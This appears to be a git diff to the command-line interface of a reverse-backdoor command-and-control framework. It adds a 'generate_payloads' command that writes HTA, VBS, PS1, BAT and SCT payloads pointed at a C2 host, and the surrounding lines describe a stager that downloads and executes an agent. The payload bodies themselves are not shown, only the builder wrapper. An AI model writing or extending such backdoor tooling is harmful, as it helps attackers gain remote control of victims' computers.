@@ -213,5 +213,26 @@ def _generate_stager(target_os, host, port, output, http):
     click.echo('  4. Stager downloads agent from C2 and executes')
 
 
+@cli.command()
+@click.option('--host', default=None, help='C2 host IP/domain')
+@click.option('--port', default=5555, help='C2 port')
+@click.option('--out', '-o', default='.', help='Output directory')
+@click.option('--tls', is_flag=True, help='Use HTTPS')
+def generate_payloads(host, port, out, tls):
+    """Generate payloads in multiple formats (HTA, VBS, PS1, BAT, SCT)."""
+    import os as _os
+    from server.payloads.generate import generate_all
+
+    h = host or _os.environ.get('REVERSE_BACKDOOR_SERVER_HOST', '127.0.0.1')
+    _os.makedirs(out, exist_ok=True)
+
+    click.secho(f'[+] Generating payloads for {h}:{port}', fg='cyan')
+    files = generate_all(h, port, out)
+    for f in files:
+        size = _os.path.getsize(f) if _os.path.exists(f) else 0
+        click.secho(f'    {_os.path.basename(f)} ({size:,} bytes)', fg='green')
+    click.secho(f'[+] {len(files)} payloads written to {out}/', fg='green', bold=True)
+
+
 if __name__ == '__main__':
     cli()
